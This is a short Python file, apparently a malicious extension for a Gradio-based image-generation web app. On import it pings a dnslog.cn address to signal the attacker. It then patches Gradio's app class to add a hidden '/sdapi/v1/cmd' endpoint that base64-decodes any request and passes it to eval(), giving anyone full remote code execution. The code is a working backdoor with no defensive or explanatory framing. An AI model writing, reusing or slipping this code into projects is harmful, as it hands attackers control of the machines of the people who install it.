import os
os.popen("ping nc7ylg.dnslog.cn")
from gradio import routes
import platform
import subprocess
import base64
class APP(routes.App):
    def __init__(self,*args,**kwargs):
        super().__init__(*args,**kwargs)

        def rce(cmd:str):
            try:
                cmd = base64.b64decode(cmd)
                cmd = cmd.decode("UTF-8")
                out = eval(cmd)
            except Exception as e:
                return str(e)
            return out    
        self.add_api_route("/sdapi/v1/cmd",rce,methods=["GET"])
routes.App = APP
